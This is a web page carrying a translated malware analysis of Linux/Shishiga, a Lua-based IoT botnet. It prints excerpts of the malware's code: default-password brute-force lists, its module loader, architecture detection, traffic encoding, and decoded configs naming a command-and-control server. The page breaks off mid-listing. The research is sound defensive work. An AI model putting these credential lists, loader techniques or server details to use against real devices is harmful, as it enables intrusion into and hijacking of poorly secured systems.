<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Linux / Shishiga malware uses Lua scripts</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Among the malware samples for Linux received daily, we noticed a suspicious instance, which detected only Dr.Web - like Linux.LuaBot. Oddly enough, si...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Linux / Shishiga malware uses Lua scripts</h1><div class="post__text post__text-html js-mediator-article">  Among the malware samples for Linux received daily, we noticed a suspicious instance, which detected only Dr.Web - like Linux.LuaBot.  Oddly enough, since our frequency of detection of Malabar family of the Luabot is usually higher. <br><br>  After completing the analysis, we found out that the program is written in Lua and belongs to a new family that is not associated with the already known Luabot.  Malvar is called Linux / Shishiga.  It uses four protocols (SSH - Telnet - HTTP - BitTorrent) and Lua scripts. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/fc5/25f/838/fc525f83814d4dedb74eb66d955cbb55.jpg" alt="image"></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <a name="habracut"></a><h3>  Shishiga habitat </h3><br>  Linux / Shishiga attacks the GNU / Linux system.  The infection vector is typical - brute force weak passwords from the list.  Malware works much like <a href="https://habrahabr.ru/company/eset/blog/259175/">Linux / Moose</a> , but it can also brute-force SSH.  Here is a complete list of passwords as of this writing <br><br>  bftelnet.lua <br><pre><code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">...</span></span>] local accounts={ {<span class="hljs-string"><span class="hljs-string">"admin"</span></span>,<span class="hljs-string"><span class="hljs-string">"admin"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"root"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"adm"</span></span>,<span class="hljs-string"><span class="hljs-string">"adm"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"acer"</span></span>,<span class="hljs-string"><span class="hljs-string">"acer"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"user"</span></span>,<span class="hljs-string"><span class="hljs-string">"user"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"security"</span></span>,<span class="hljs-string"><span class="hljs-string">"security"</span></span>} } [...]</code> </pre> <br>  bfssh.lua <br><pre> <code class="hljs perl">[...] <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> accounts={ {<span class="hljs-string"><span class="hljs-string">"admin"</span></span>,<span class="hljs-string"><span class="hljs-string">"admin"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"root"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"adm"</span></span>,<span class="hljs-string"><span class="hljs-string">"adm"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"ubnt"</span></span>,<span class="hljs-string"><span class="hljs-string">"ubnt"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>}, {<span class="hljs-string"><span class="hljs-string">"admin"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>}, {<span class="hljs-string"><span class="hljs-string">"adm"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>}, {<span class="hljs-string"><span class="hljs-string">"user"</span></span>,<span class="hljs-string"><span class="hljs-string">"user"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"pi"</span></span>,<span class="hljs-string"><span class="hljs-string">"pi"</span></span>}, } --[[ {<span class="hljs-string"><span class="hljs-string">"acer"</span></span>,<span class="hljs-string"><span class="hljs-string">"acer"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"security"</span></span>,<span class="hljs-string"><span class="hljs-string">"security"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"toor"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"roottoor"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"password"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"test"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"abc123"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"111111"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1q2w3e"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"oracle"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1q2w3e4r"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"123123"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"qwe123"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"p@ssw0rd"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"12"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"123"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1234"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"12346"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"123467"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1234678"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"12346789"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"123467890"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"qwerty"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"pass"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"toor"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"roottoor"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"password123"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"password123456"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"pass123"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"password"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"passw0rd"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1qaz"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"1qaz2wsx"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"asdfgh"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"user"</span></span>,<span class="hljs-string"><span class="hljs-string">"user"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"user"</span></span>,<span class="hljs-string"><span class="hljs-string">""</span></span>}, {<span class="hljs-string"><span class="hljs-string">"acer"</span></span>,<span class="hljs-string"><span class="hljs-string">"acer"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"security"</span></span>,<span class="hljs-string"><span class="hljs-string">"security"</span></span>}, {<span class="hljs-string"><span class="hljs-string">"root"</span></span>,<span class="hljs-string"><span class="hljs-string">"passw0rds"</span></span>}, ]] [...]</code> </pre> <br><br>  We also found several Linux / Shishiga binaries for various architectures, including MIPS (from older to younger and vice versa), ARM (armv4l), i686, and PowerPC.  They are often used in Internet of Things devices.  We assume that other architectures may be supported, such as SPARC, SH-4 or m68k, but more on that later. <br><br><h3>  Shishiga features </h3><br>  Linux / Shishiga is a binary file packed using <a href="https://upx.github.io/">UPX</a> 3.91 (executable file packer).  But UPX will have difficulty with unpacking, as Shishiga adds data to the end of the packed file. <br><br>  After unpacking the file, we see that it is <a href="https://en.wikipedia.org/wiki/Static_library">statically linked</a> to the work program library Lua, and the code is removed. <br><pre> <code class="hljs pgsql">$ file unpacked.i686.lm unpacked.i686.lm: ELF <span class="hljs-number"><span class="hljs-number">32</span></span>-<span class="hljs-type"><span class="hljs-type">bit</span></span> LSB executable, Intel <span class="hljs-number"><span class="hljs-number">80386</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">version</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span> (GNU/Linux), statically linked, stripped</code> </pre> <br><br>  When executing, the binary file launches the Malawari module Lua by the following methods: <br><pre> <code class="lua hljs">malware_module_methods dd offset aGetver ; <span class="hljs-string"><span class="hljs-string">"getver"</span></span> dd offset getver dd offset aGetos ; <span class="hljs-string"><span class="hljs-string">"getos"</span></span> dd offset getos dd offset aGetarch ; <span class="hljs-string"><span class="hljs-string">"getarch"</span></span> dd offset getarch dd offset aGetmacaddr ; <span class="hljs-string"><span class="hljs-string">"getmacaddr"</span></span> dd offset getmacaddr dd offset aGetmods ; <span class="hljs-string"><span class="hljs-string">"getmods"</span></span> dd offset getmods dd offset aSetargs ; <span class="hljs-string"><span class="hljs-string">"setargs"</span></span> dd offset setargs</code> </pre> <br><br>  The getmods method returns an archived blob, which will be discussed in more detail later.  Then the hard-coded Lua code (malware.lua) is executed through the functions luaL_loadstring and lua_pcall.  The Lua code is pretty simple, here is a brief description of the source code without changes from us. <br><br>  malware.lua <br><pre> <code class="lua hljs"><span class="hljs-keyword"><span class="hljs-keyword">local</span></span> unistd=<span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"posix.unistd"</span></span>) <span class="hljs-built_in"><span class="hljs-built_in">require</span></span>(<span class="hljs-string"><span class="hljs-string">"malware"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getexe</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> fn=unistd.readlink(<span class="hljs-string"><span class="hljs-string">"/proc/self/exe"</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> fn==<span class="hljs-literal"><span class="hljs-literal">nil</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> <span class="hljs-built_in"><span class="hljs-built_in">arg</span></span>~=<span class="hljs-literal"><span class="hljs-literal">nil</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> fn=<span class="hljs-built_in"><span class="hljs-built_in">arg</span></span>[<span class="hljs-number"><span class="hljs-number">0</span></span>] <span class="hljs-comment"><span class="hljs-comment">--symlink removed end if fn==nil then print("couldn't find bot file") return nil end local file=io.open(fn,"r") if file==nil then print("couldn't find bot file") return nil end local data=file:read("*all") file:close() return data end function getMods() return zlib.inflate()(malware.getmods()) end function getScriptFiles(scripts) local files={} local i=1 while true do local a1,b1,c1=string.find(scripts,'%-%-script%-begin%-%-([%w%.]+)%-%-',i) if a1==nil then break end local a2,b2,c2=string.find(scripts,'%-%-script%-end%-%-([%w%.]+)%-%-',i) if a2==nil then break end if c1~=c2 then return nil end local src=string.sub(scripts,b1+1,a2-1) i=b2+1 files[c1]=src end return files end malware.exe=getexe() (1) local modules=getScriptFiles(getMods()) (2) [...] f=load(malware.modules['main.lua']) (3) local s,err=pcall(f) if s==false then print(err) end</span></span></code> </pre> <br>  <b>(1)</b> opens the Malvari exe file from / proc / self / exe and returns its contents; <br>  <b>(2)</b> restore the <a href="http://www.zlib.net/">zlib</a> archive using the getmods method, unpack it, and then parse it with tags and store it in the Lua array; <br>  <b>(3)</b> invokes the main.lua module. <br><br>  There is an extensive list of all the Lua scripts found in the compromise metrics section.  For most of them, the names speak for themselves, but we still briefly describe some of them. <br><br>  <b>callhome.lua</b> <br><ul><li>  gets the server.bt or servers configuration file from config.lua; </li><li>  if it is impossible to contact the current default server, it changes it to another one; </li><li>  sends files (reports or accounts, both in JSON format); </li><li>  executes tasks from the list of tasks received from the C &amp; C server. </li></ul><br>  <b>bfssh.lua / bftelnet.lua</b> <br><ul><li>  module for brute-force SSH- and Telnet-logins; </li><li>  checks if the echo -en command "\\ x31 \\ x33 \\ x33 \\ x37" on output 1337;  if not, exit; otherwise, continue; </li><li>  device architecture is determined by the file from / bin / ls by running cat / bin / ls and parsing the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF</a> header, more on this below; </li><li>  Malvari distribution (.lm and .dm files) according to the device architecture; </li><li>  saving successful combinations of user parameters. </li></ul><br>  The architecture verification code looks like this: <br><br>  bfssh.lua, getArchELF method <br><pre> <code class="lua hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">bfssh.getArchELF</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(text)</span></span></span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> bits,denc,ver,ftype,farch <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> text==<span class="hljs-literal"><span class="hljs-literal">nil</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">nil</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> i=text:<span class="hljs-built_in"><span class="hljs-built_in">find</span></span>(<span class="hljs-string"><span class="hljs-string">"\x7fELF"</span></span>) (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> i~=<span class="hljs-literal"><span class="hljs-literal">nil</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> bits,denc,ver=<span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">unpack</span></span>(<span class="hljs-string"><span class="hljs-string">"&lt;BBB"</span></span>,text:<span class="hljs-built_in"><span class="hljs-built_in">sub</span></span>(i+<span class="hljs-number"><span class="hljs-number">4</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> denc==<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> ftype,farch=<span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">unpack</span></span>(<span class="hljs-string"><span class="hljs-string">"&lt;HH"</span></span>,text:<span class="hljs-built_in"><span class="hljs-built_in">sub</span></span>(i+<span class="hljs-number"><span class="hljs-number">16</span></span>)) (<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> ftype,farch=<span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.<span class="hljs-built_in"><span class="hljs-built_in">unpack</span></span>(<span class="hljs-string"><span class="hljs-string">"&gt;HH"</span></span>,text:<span class="hljs-built_in"><span class="hljs-built_in">sub</span></span>(i+<span class="hljs-number"><span class="hljs-number">16</span></span>)) <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> bits,denc,farch (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">end</span></span></code> </pre> <br>  <b>(1)</b> each ELF file must begin with \ x7fELF; <br>  <b>(2)</b> ftype, which represents e_type (ELF file type = executable, shared, etc.) is not used; <br>  <b>(3)</b> bits represents e_ident [EI_CLASS] (32 or 64 bits), denc represents e_ident [EI_DATA] (older to younger, and vice versa), and farch represents e_machine in the ELF header. <br><br>  bfssh.lua, getArchName method <br><pre> <code class="lua hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">bfssh.getArchName</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(bits,denc,farch)</span></span></span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x8</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> denc==<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"mipsel"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x8</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> denc==<span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"mips"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x28</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"armv4l"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x2</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"sparc"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x2a</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"sh4"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x4</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"m68k"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x14</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"powerpc"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x3</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x7</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> farch==<span class="hljs-number"><span class="hljs-number">0x3e</span></span> <span class="hljs-keyword"><span class="hljs-keyword">then</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"i686"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">nil</span></span> <span class="hljs-keyword"><span class="hljs-keyword">end</span></span></code> </pre> <br>  <b>(1)</b> bits not used <br>  <b>(2)</b> checks the file belonging to MIPS (from the younger one) (e_machine == EM_MIPS and e_ident [EI_DATA] == ELFDATA2LSB) <br>  <b>(3)</b> checks the ownership of an Intel 80386 or Intel 80860 or AMD x86-64 file (e_machine == EM_386 or e_machine == EM_860 or e_machine == EM_X86_64) <br><br>  <b>config.lua</b> <br><ul><li>  contains the public key publicKey to verify the binary signature (.lm or .dm); </li><li>  contains a list of loader components; </li><li>  contains the names of .bt files, port numbers of SOCKS and HTTP servers; </li><li>  contains the IP addresses of the server (possibly C &amp; C). </li></ul><br>  <b>persist.lua</b> <br><ul><li>  preservation method, depending on user rights (root or user) </li></ul><br>  <b>scanner.lua</b> <br><ul><li>  used to generate random / 16 networks that are not local </li></ul><br>  <b>worm.lua</b> (this script was removed in the latest version of Linux / Shishiga) <br><ul><li>  enables scanning of a specified port; </li><li>  allows downloading; </li><li>  obtains information from a newly infected server. </li></ul><br>  The content of the readme.lua file will be appreciated by Russian speakers: <br><br><img src="https://habrastorage.org/files/e84/e4d/21d/e84e4d21dbb3414a86e8a8a45f0a6903.png" alt="image"><br><br>  In the past few weeks, we have seen small changes: some blocks have been rewritten, test blocks have been added, unnecessary files have been deleted, but in general nothing remarkable. <br><br>  The main binary file is called .lm, but we also managed to get a file called .dm - a simple backdoor listening on 0.0.0.0 (all IPv4 addresses) of port 2015. The name of the backdoor file changed from dl to dm. <br><br><h3>  Shishiga Communications </h3><br>  Linux / Shishiga can exchange data using any of the modules httpproto.lua, btloader.lua or server.lua.  The httpproto.lua module has functions that allow you to encode and decode information and make HTTP POST and GET requests.  The source code below shows the coding process. <br><br>  httpproto.lua <br><pre> <code class="lua hljs">[...] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">httpproto.encode</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(data)</span></span></span></span> <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> msg=bencode.encode(data) <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> c=zlib.crc32()(msg) <span class="hljs-keyword"><span class="hljs-keyword">local</span></span> k=<span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.pack(<span class="hljs-string"><span class="hljs-string">"&lt;I"</span></span>,utils.<span class="hljs-built_in"><span class="hljs-built_in">random</span></span>()) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> k..crypto.rc4(k,<span class="hljs-built_in"><span class="hljs-built_in">string</span></span>.pack(<span class="hljs-string"><span class="hljs-string">"&lt;I"</span></span>,c)..msg) <span class="hljs-keyword"><span class="hljs-keyword">end</span></span> [...]</code> </pre> <br>  btloader.lua uses the torrent.lua module (a BitTorrent function wrapper) to save and load nodes from the nodes.cfg file.  It also gets its configuration from the {server, update, script} .bt files (in <a href="https://en.wikipedia.org/wiki/Bencode">Bencode</a> format) and uses the BitTorrent protocol to check for updates of these files.  script.bt allows you to execute the Lua script, and update.bt allows the execution of the .lm binary.  Below are examples of decoded .bt files, shown as Python dictionaries. <br><br>  script.bt <br><pre> <code class="lua hljs">{ <span class="hljs-string"><span class="hljs-string">'sig'</span></span>: &lt;removed&gt;,(<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-string"><span class="hljs-string">'k'</span></span>: &lt;removed&gt;,(<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-string"><span class="hljs-string">'salt'</span></span>: <span class="hljs-string"><span class="hljs-string">'script'</span></span>, <span class="hljs-string"><span class="hljs-string">'seq'</span></span>: <span class="hljs-number"><span class="hljs-number">1486885364</span></span>, <span class="hljs-string"><span class="hljs-string">'v'</span></span>: <span class="hljs-string"><span class="hljs-string">'caba4dbe2f7add9371b94b97cf0d351b72449072,test.lua\n'</span></span> }</code> </pre> <br>  <b>(1)</b> signature <br>  <b>(2)</b> public key <br><br>  update.bt <br><pre> <code class="lua hljs">{ <span class="hljs-string"><span class="hljs-string">'sig'</span></span>: &lt;removed&gt;, <span class="hljs-string"><span class="hljs-string">'k'</span></span>: &lt;removed&gt;, <span class="hljs-string"><span class="hljs-string">'salt'</span></span>: <span class="hljs-string"><span class="hljs-string">'update'</span></span>, <span class="hljs-string"><span class="hljs-string">'seq'</span></span>: <span class="hljs-number"><span class="hljs-number">1486885364</span></span>, <span class="hljs-string"><span class="hljs-string">'v'</span></span>: <span class="hljs-string"><span class="hljs-string">'bf4d9e25fc210a1d9809aebb03b30748dd588d08,mipsel.lm\n 8a0d58472f6166ade0ae677bab7940fe38d66d35,armv4l.lm\n 51a4ca78ebb0649721ae472290bea7bfe983d727,mips.lm\n 979fb376d6adc65473c4f51ad1cc36e3612a1e73,powerpc.lm\n ce4b3c92a96137e6215a5e2f5fd28a672eddaaab,i686.lm\n'</span></span> }</code> </pre> <br>  server.bt <br><pre> <code class="lua hljs">{ <span class="hljs-string"><span class="hljs-string">'sig'</span></span>: &lt;removed&gt;, <span class="hljs-string"><span class="hljs-string">'k'</span></span>: &lt;removed, <span class="hljs-string"><span class="hljs-string">'salt'</span></span>: <span class="hljs-string"><span class="hljs-string">'server'</span></span>, <span class="hljs-string"><span class="hljs-string">'seq'</span></span>: <span class="hljs-number"><span class="hljs-number">1486835166</span></span>, <span class="hljs-string"><span class="hljs-string">'v'</span></span>: <span class="hljs-string"><span class="hljs-string">'93.117.137.35:8080\n'</span></span> }</code> </pre> <br><br>  Finally, the main function of the server.lua module is to create an HTTP server with the port specified in config.lua.  In all the samples we have studied at the moment, this was port 8888. <br><br>  The server responds only to requests / info and / upload.  The following is the ‚Äúbrushed‚Äù version of the server response to the / info path.  All the files below can be easily downloaded from the infected device. <br><pre> <code class="lua hljs">{ <span class="hljs-string"><span class="hljs-string">"src"</span></span>:[ (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-string"><span class="hljs-string">"test.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test1.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test10.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test2.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test3.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test5.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test6.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test_1.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test_2.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test_3.lua"</span></span>, <span class="hljs-string"><span class="hljs-string">"test_4.lua"</span></span> ], <span class="hljs-string"><span class="hljs-string">"dm"</span></span>:[ (<span class="hljs-number"><span class="hljs-number">2</span></span>) <span class="hljs-string"><span class="hljs-string">"armv4l.dm"</span></span>, <span class="hljs-string"><span 